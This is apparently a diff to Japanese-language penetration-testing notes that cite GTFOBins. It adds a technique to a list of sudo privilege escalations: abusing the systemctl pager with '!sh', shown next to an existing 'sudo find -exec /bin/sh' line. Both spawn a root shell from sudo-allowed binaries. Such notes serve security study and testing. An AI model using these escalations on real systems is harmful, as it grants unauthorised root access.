@@ -7,4 +7,7 @@ https://gtfobins.github.io/
 :shell
 # findの悪用
 sudo find . -exec /bin/sh \; -quit
+# systemctlとpagerの悪用
+sudo systemctl status <サービス>
+- (press RETURN)!sh
 ```
